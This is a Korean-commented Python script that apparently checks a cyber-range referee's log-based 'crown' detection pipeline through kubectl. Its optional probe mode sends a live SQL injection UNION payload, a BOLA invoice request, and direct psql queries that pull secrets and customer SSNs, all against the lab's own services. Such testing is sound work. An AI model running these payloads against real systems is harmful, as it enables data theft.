"""크라운(플래그리스) 라이브 검증 — 접근기록 통로가 실제로 끝까지 도는지 찌른다.

플래그리스 전환(심판이 '값 대조'가 아니라 '접근기록 crowns'로 판정)은 단위 테스트는 통과했지만,
라이브 로그 형식 가정이 실제와 어긋나면 판정이 조용히 비어버린다. 이 스크립트는 그 체인을
끝까지 점검한다(오케스트레이터 전체 루프 없이, kubectl 로 직접):

  수집  : kubectl logs 로 앱(catalog/order)·postgres 실 로그를 뜬다.
  파싱  : AppLogSource/DbLogSource(실제 심판이 쓰는 그 코드)로 crowns_in_window 를 돌린다.
  판정  : default_objectives 로 reached_goals 를 낸다.
  진단  : 각 통로에서 크라운이 뽑혔나 / 안 뽑혔으면 '자백이 안 떴나 vs 파서 형식 불일치'를 가른다.

  # VM C(또는 관리망, kubeconfig 가 있는 곳)에서:
  python scripts/poke_crown.py                      # 최근 10분 로그로 수집→파싱→판정
  python scripts/poke_crown.py --since 30m          # 기간 조정
  python scripts/poke_crown.py --probe              # 먼저 민감 요청(SQLi·BOLA)으로 자백 유발 후 점검
  python scripts/poke_crown.py --probe --db-probe --db-cred 'host=... dbname=... user=... password=...'
                                                    # 직접 DB 접속(③ 경로)까지 유발

기본은 '수집→파싱→판정'만(읽기 전용). --probe 는 임시 파드로 공격 요청을 실제로 날린다(파괴적 아님).
"""
from __future__ import annotations

import argparse
import subprocess
import sys
import time
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from orchestrator.app_log_source import AppLogSource  # noqa: E402
from orchestrator.db_log_source import DbLogSource    # noqa: E402
from orchestrator.objectives import default_objectives  # noqa: E402

_G, _R, _Y, _X = "\033[32m", "\033[31m", "\033[33m", "\033[0m"


def _kubectl(args: list[str], *, kubeconfig: str | None) -> str:
    cmd = ["kubectl"]
    if kubeconfig:
        cmd += ["--kubeconfig", kubeconfig]
    cmd += args
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    except (OSError, subprocess.TimeoutExpired) as e:
        print(f"  {_R}✗ kubectl 실패{_X}: {' '.join(args)} — {type(e).__name__}: {e}")
        return ""
    if r.returncode != 0:
        print(f"  {_R}✗ kubectl rc={r.returncode}{_X}: {' '.join(args)}\n    {r.stderr.strip()[:300]}")
    return r.stdout


def _logs(deploy: str, ns: str, *, since: str, kubeconfig: str | None) -> list[str]:
    out = _kubectl(["-n", ns, "logs", f"deploy/{deploy}", f"--since={since}", "--prefix"],
                   kubeconfig=kubeconfig)
    return out.splitlines()


# ───────────── probe: 자백 유발(임시 파드) ─────────────
_SQLI = ("/api/products?q=%27%20UNION%20SELECT%20key%2Cvalue%2Cnote%2C%27%27%2C%27%27"
         "%20FROM%20internal_secrets--")   # UNION 으로 internal_secrets 추출


def _probe_app(ns: str, kubeconfig: str | None) -> None:
    print(f"\n[probe] 임시 파드로 앱 민감 요청(SQLi·BOLA) 유발 (ns={ns})")
    sh = (f"curl -s -o /dev/null -w 'catalog SQLi %{{http_code}}\\n' "
          f"'http://catalog-api:8080{_SQLI}'; "
          f"curl -s -o /dev/null -w 'order BOLA %{{http_code}}\\n' "
          f"'http://order-api:8080/api/invoice/7'")
    out = _kubectl(["-n", ns, "run", f"poke-crown-{int(time.time())}", "--rm", "-i",
                    "--restart=Never", "--image=curlimages/curl:8.10.1", "--command", "--",
                    "sh", "-c", sh], kubeconfig=kubeconfig)
    for line in out.splitlines():
        if line.strip():
            print(f"    {line}")


def _probe_db(ns: str, cred: str, kubeconfig: str | None) -> None:
    print(f"\n[probe] 임시 파드로 직접 DB 접속(③ 경로) 유발 (ns={ns})")
    # 유출 크레덴셜을 가진 공격자처럼 postgres 에 직접 붙어 민감 테이블 조회.
    sh = f"PGCONNECT_TIMEOUT=5 psql '{cred}' -c 'SELECT * FROM internal_secrets' -c 'SELECT ssn,email FROM customers'"
    out = _kubectl(["-n", ns, "run", f"poke-crown-db-{int(time.time())}", "--rm", "-i",
                    "--restart=Never", "--image=postgres:16-alpine", "--command", "--",
                    "sh", "-c", sh], kubeconfig=kubeconfig)
    tail = [ln for ln in out.splitlines() if ln.strip()][-4:]
    for line in tail:
        print(f"    {line}")


# ───────────── 수집→파싱→판정 ─────────────
def _window(since: str) -> tuple[float, float]:
    units = {"s": 1, "m": 60, "h": 3600}
    try:
        secs = int(since[:-1]) * units.get(since[-1], 60)
    except (ValueError, IndexError):
        secs = 600
    now = time.time()
    return now - secs - 5, now + 60   # 여유를 둬 경계 로그도 포함


def _check(label: str, lines: list[str], src, since: str) -> set[str]:
    t0, t1 = _window(since)
    crowns = src.crowns_in_window(since_ts=t0, until_ts=t1)
    n = len(lines)
    if crowns:
        print(f"  {_G}✓ {label}{_X}: 로그 {n}줄 → 크라운 {sorted(crowns)}")
    elif n == 0:
        print(f"  {_Y}· {label}{_X}: 로그 0줄 (파드 미가동·기간 밖·수집 실패)")
    else:
        print(f"  {_Y}· {label}{_X}: 로그 {n}줄인데 크라운 0 "
              f"(자백이 안 떴거나 — 파서 형식 불일치. 아래 샘플 확인)")
        for s in lines[:3]:
            print(f"      {s[:160]}")
    return crowns


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="크라운(플래그리스) 라이브 검증")
    ap.add_argument("--kubeconfig", default=None)
    ap.add_argument("--since", default="10m", help="로그 조회 기간(예: 10m, 30m, 1h)")
    ap.add_argument("--app-ns", default="backend")
    ap.add_argument("--db-ns", default="database")
    ap.add_argument("--probe", action="store_true", help="먼저 앱 민감 요청으로 자백 유발")
    ap.add_argument("--db-probe", action="store_true", help="직접 DB 접속까지 유발(--db-cred 필요)")
    ap.add_argument("--db-cred", default="", help="postgres 접속 문자열(공격자 관점)")
    args = ap.parse_args(argv)

    if args.probe:
        _probe_app(args.app_ns, args.kubeconfig)
        if args.db_probe:
            if not args.db_cred:
                print(f"  {_Y}· --db-probe 엔 --db-cred 가 필요{_X} — DB 유발 생략")
            else:
                _probe_db(args.db_ns, args.db_cred, args.kubeconfig)
        print("  (자백이 로그에 수집되도록 잠시 대기…)")
        time.sleep(4)

    print(f"\n=== 수집→파싱→판정 (since={args.since}) ===")
    # 앱 통로: catalog-api + order-api stdout(JSON 감사/자백) → AppLogSource
    app_lines: list[str] = []
    for d in ("catalog-api", "order-api"):
        app_lines += _logs(d, args.app_ns, since=args.since, kubeconfig=args.kubeconfig)
    app_crowns = _check("앱 통로(AppLogSource)", app_lines,
                        AppLogSource(lambda: iter(app_lines)), args.since)

    # DB 통로: postgres statement 로그 → DbLogSource
    db_lines = _logs("postgres", args.db_ns, since=args.since, kubeconfig=args.kubeconfig)
    db_crowns = _check("DB 통로(DbLogSource)", db_lines,
                       DbLogSource(lambda: iter(db_lines)), args.since)

    # 판정: 심판과 같은 objectives 로 goal 달성 확인
    crowns = app_crowns | db_crowns
    objectives = default_objectives()
    goals = objectives.reached_goals({"crown": {"asset": crowns}})
    reached = objectives.reached_objectives({"crown": {"asset": crowns}})
    print("\n=== 판정(심판과 동일 objectives) ===")
    print(f"  반출 크라운 자산: {sorted(crowns) or '없음'}")
    print(f"  달성 objective  : {sorted(reached) or '없음'}")
    print(f"  달성 goal       : {sorted(goals) or '없음'}")
    if goals:
        print(f"  {_G}✓ 플래그리스 체인 OK — 접근기록만으로 크라운 판정됨{_X}")
        return 0
    print(f"  {_Y}· 크라운 판정 안 됨{_X} — 위 통로별 진단 참고(자백 미발생 vs 파서 형식). "
          f"--probe 로 자백을 유발해보라")
    return 1


if __name__ == "__main__":
    sys.exit(main())
